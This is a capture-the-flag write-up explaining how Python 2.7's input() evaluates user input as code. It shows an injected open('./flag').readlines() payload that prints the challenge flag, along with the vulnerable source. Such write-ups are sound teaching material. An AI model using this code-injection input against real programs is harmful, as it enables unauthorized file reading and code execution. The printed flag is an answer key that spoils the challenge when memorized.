# Writeup: What's your input?

In order to solve this CTF we will have to take advantage of a vulnerability present in the input function of the Python 2.7 library. The input function in Python 2.7 evaluates all input passed into that function as raw python code allowing us to write python code to the input to get the flag.
```
    What's your favorite number?
    Number? 2018
    You said: 2018
    I agree!
    What's the best city to visit?
    City? open("./flag").readlines()
    You said: ['picoCTF{v4lua4bl3_1npu7_3a7b75f4}\n']
    Thanks for your input!
```
As you can see we were able to obtain the flag. I borrowed the open flag code from the source code provided to us. Below is the relevant source code.
```
    while not res:
        try:
            res = input("Number? ")
            print("You said: {}".format(res))
        except:
            res = None

    if res != year:
        print("Okay...")
    else:
        print("I agree!")

    print("What's the best city to visit?")
    res = None
    while not res:
        try:
            res = input("City? ")
            print("You said: {}".format(res))
        except:
            res = None

    if res == city:
        print("I agree!")
        flag = open("./flag").read()
        print(flag)
    else:
        print("Thanks for your input!")

```

